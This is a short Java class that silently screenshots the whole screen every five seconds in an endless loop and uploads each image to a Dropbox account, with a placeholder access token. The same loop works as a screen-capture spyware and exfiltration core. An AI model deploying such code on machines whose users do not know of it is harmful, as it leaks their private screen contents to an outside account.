import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * created by Aleksandr Chusovitin 10/07/2019
 */

public class MyThread extends Thread {
    @Override
    public void run() {
        String ACCESS_TOKEN = "enter your dropbox token here";

        // Create Dropbox client
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

        while (true) {
            try {
                // Date format
                DateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
                Date today = new Date();

                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream os = new ByteArrayOutputStream();
                ImageIO.write(image, "png", os);

                // Upload screenshots to Dropbox
                InputStream in = new ByteArrayInputStream(os.toByteArray());
                client.files().uploadBuilder("/" + dateFormat.format(today) + ".png").uploadAndFinish(in);
                sleep(5000);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}

